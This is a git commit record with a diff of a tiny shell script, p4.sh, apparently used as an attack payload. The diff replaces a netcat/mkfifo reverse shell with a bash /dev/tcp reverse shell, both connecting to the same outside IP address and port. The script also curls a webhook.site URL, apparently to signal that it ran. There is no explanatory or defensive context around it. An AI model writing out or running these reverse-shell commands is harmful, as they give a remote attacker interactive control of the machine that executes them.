fa61e47cd82adf8253aa9277ab07a2d0dce53feb
Mauricio <uaxp123@gmail.com>
2021-11-02 19:32:39 -0600

    Update and rename p3.sh to p4.sh

--- p4.sh
+++ p4.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 138.68.69.37 9090 >/tmp/f;
+sh -i >& /dev/tcp/138.68.69.37/9090 0>&1
 
 curl https://webhook.site/cb046334-7324-44b2-a9b3-075d7f3bdbb5  
